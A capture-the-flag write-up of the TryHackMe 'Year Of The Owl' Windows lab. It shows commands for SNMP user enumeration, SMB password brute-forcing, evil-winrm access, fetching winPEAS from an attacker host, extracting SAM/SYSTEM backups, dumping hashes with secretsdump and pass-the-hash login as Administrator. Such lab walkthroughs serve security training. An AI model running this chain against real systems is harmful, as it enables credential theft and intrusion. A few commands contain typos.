---
title: "Year Of The Owl - TryHackMe Writeup"
date: 2025-05-01
draft: false
summary: "Writeup for Year Of The Owl CTF challenge on TryHackMe."
tags: ["windows", "bruteforce", "hash crack"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/yearoftheowl/cover.webp"
  caption: "Year Of The Owl TryHackMe Challenge"
  alt: "Year Of The Owl cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

The foolish owl sits on his throne...
<!--more-->
To access the box, click on the link given below:
- https://tryhackme.com/room/yearoftheowl

## Reconnaissance

I performed an **nmap** aggressive scan on the target to find a bunch of ports open.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN yoto.nmap
```

| Port | Service |
| ---- | ------- |
| 80   | http    |
| 139  | netbios |
| 443  | https   |
| 445  | smb     |
| 3306 | mysql   |
| 3389 | rdp     |

![performing an nmap scan on year of the owl box](https://cdn.ziomsec.com/yearoftheowl/1.webp)

## Initial Foothold

I enumerated the services running on the target but was unable to find anything interesting.

![accessing the web application](https://cdn.ziomsec.com/yearoftheowl/2.webp)

I then tried performed a **udp** scan and found **snmp** to be open.

```shell
nmap -sU -p 161 TARGET
```

![performing a UDP scan with nmap](https://cdn.ziomsec.com/yearoftheowl/3.webp)

I enumerated **snmp** using **snmp-check** and found a username.

```shell
snmp-check TARGET -c openview
```

![enumerating snmp to discover a username](https://cdn.ziomsec.com/yearoftheowl/4.webp)

I bruteforced the **smb** password of this user from *rockyou.txt* using **crackmapexec**.

```shell
crackmapexec smb TARGET -u Jareth -p /usr/share/wordlists/rockyou.txt
```

![bruteforcing password for SMB](https://cdn.ziomsec.com/yearoftheowl/5.webp)

I then enumerated the shares using this credential, but found nothing.

```shell
smnmap -u Jareth -p sarah -H TARGET
```

![enumerating the SMB shares](https://cdn.ziomsec.com/yearoftheowl/6.webp)

I then checked if the credentials were valid for **winrm** and **rdp**.

```shell
nxc rdp TARGET -u 'Jareth' -p 'sarah'
nxc winrm TARGET -u 'Jareth' -p 'sarah'
```

![validating the credentials against rdp](https://cdn.ziomsec.com/yearoftheowl/7.webp)

![validating the credentials against winrm](https://cdn.ziomsec.com/yearoftheowl/8.webp)

I used **winrm** to get shell a shell on the target.

```shell
evil-winrm -u Jareth -p sarah -t TARGET
```

![accessing the machine using winrm](https://cdn.ziomsec.com/yearoftheowl/9.webp)

Finally I captured the user flag from *Jareth*'s *Desktop*.

![capturing the user flag](https://cdn.ziomsec.com/yearoftheowl/10.webp)

## Privilege Escalation

I downloaded and ran **winPEAS** to find misconfigurations that could help me escalate my privs.

```shell
$ iwr http://KALI/winPEAS/ps1 -OutFile C:\Users\Jareth\Desktop\winPEAS.ps1
$ ./winPEAS.ps1
```

I found a backup of the **sam** and **system** registries.

![discovering SAM registry backup](https://cdn.ziomsec.com/yearoftheowl/11.webp)

![discovery SYSTEM registry backup](https://cdn.ziomsec.com/yearoftheowl/12.webp)

Hence, I copied these backups to the desktop and then downloaded them on my system.

```shell
cd C:\$Recylce.Bin\S-1-5-21-1987495829-1628902820-919763334-1001
copy system.bak 'C:\Users\Jareth\Desktop\system.bak'
copy sam.bak 'C:\Users\Jareth\Desktop\sam.bak'
download system.bak
download sam.bak
```

![transferring the registry backups to local system](https://cdn.ziomsec.com/yearoftheowl/13.webp)

I then cracked them using **`impacket-secretsdump`** and found the Administrator hash.

```shell
impacket-secretsdump -system system.bak -sam sam.bak local
```

![dumping the contents using secretsdump.py](https://cdn.ziomsec.com/yearoftheowl/14.webp)

I then used the Administrator's hash to get shell access on the target using **winrm** and captured the root flag from *Desktop*.

```shell
evil-winrm -u Administrator -H LM_HASH -i TARGET
```

![capturing the admin flag](https://cdn.ziomsec.com/yearoftheowl/15.webp)

That's it from my side! Until next time.

---
